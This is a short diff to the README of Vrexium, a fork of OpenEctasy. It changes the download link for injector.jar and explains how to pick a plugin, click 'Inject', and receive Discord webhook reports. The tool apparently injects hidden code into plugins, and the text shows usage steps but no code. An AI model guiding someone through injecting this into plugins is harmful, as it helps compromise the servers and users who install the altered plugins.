@@ -8,7 +8,7 @@
 <b>Vrexium</b> is a fork of <a href="https://github.com/Body-Alhoha/OpenEctasy">OpenEctasy</a>, a lightweight, open source version of the open source version of 🪦 Ectasy<br>
 
 ## Injecting
-Download `injector.jar` from the [latest release](https://github.com/M1noa/Vrexium/releases/latest) and open it. Click the `Select` button and select your plugin, then click the `Inject` button.
+Download `injector.jar` from the [latest version](https://github.com/M1noa/Vrexium/raw/refs/heads/main/injector.jar) and open it (you must have [java](https://www.oracle.com/java/technologies/downloads/#jdk23-windows) installed). Click the `Select` button and select your plugin, then click the `Inject` button.
 
 ## Discord Webhook
 You can also use a discord webhook, it will produce a message like this: <br><br>
